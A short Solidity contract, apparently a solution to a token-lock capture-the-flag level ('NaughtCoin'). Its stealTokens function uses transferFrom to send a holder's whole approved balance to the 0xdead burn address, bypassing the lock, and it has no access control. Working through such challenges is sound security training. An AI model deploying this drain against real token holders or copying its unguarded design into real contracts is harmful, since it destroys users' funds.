// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TokenStealer {
    address public constant BURN = address(0xdead);
    
    // This function assumes the player has already approved this contract
    function stealTokens(address token, address from) external {
        IERC20 naughtCoin = IERC20(token);
        uint256 balance = naughtCoin.balanceOf(from);
        require(balance > 0, "No balance");
        
        // Transfer tokens from the player to the burn address
        bool success = naughtCoin.transferFrom(from, BURN, balance);
        require(success, "Transfer failed");
    }
    
    // Just for testing - get player balance
    function getPlayerBalance(address token, address player) external view returns (uint256) {
        return IERC20(token).balanceOf(player);
    }
}